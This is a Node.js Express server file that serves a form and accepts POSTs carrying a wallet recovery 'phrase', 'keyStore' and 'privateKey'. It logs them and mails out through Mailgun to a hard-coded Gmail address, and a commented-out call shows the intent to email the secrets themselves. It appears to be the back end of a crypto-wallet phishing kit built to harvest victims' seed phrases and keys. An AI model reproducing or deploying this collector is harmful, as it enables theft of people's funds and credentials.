const express = require("express");
const path = require("path");
// const sendMail = require("./mail");
const app = express();
const mailgun = require("mailgun-js");

require("custom-env").env();

const PORT = 8080;

// data parsing
app.use(express.urlencoded({ extended: false }));

app.use(express.json());

app.post("/email", (req, res) => {
  // send email here
  const { phrase, keyStore, privateKey } = req.body;
  console.log("Data: ", req.body);

  const mg = mailgun({
    apiKey: process.env.apikey,
    domain: process.env.domain,
  });

  const data = {
    from: "bankoleidris2001@gmail.com",
    to: "ycomng@gmail.com",
    subject: "Hello",
    text: "Testing some Mailgun awesomness!",
  };
  mg.messages().send(data, function (error, body) {
    console.log(body);
    console.log(error);
  });
  // sendMail(phrase, keyStore, privateKey, function (err, data) {
  //   if (err) {
  //     console.log(err);
  //     res.status(500).json({ message: "internal error" });
  //   } else {
  //     res.json({ message: "email sent" });
  //   }
  // });
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "form.html"));
});

app.listen(PORT, () => console.log("listening on port, ", PORT));
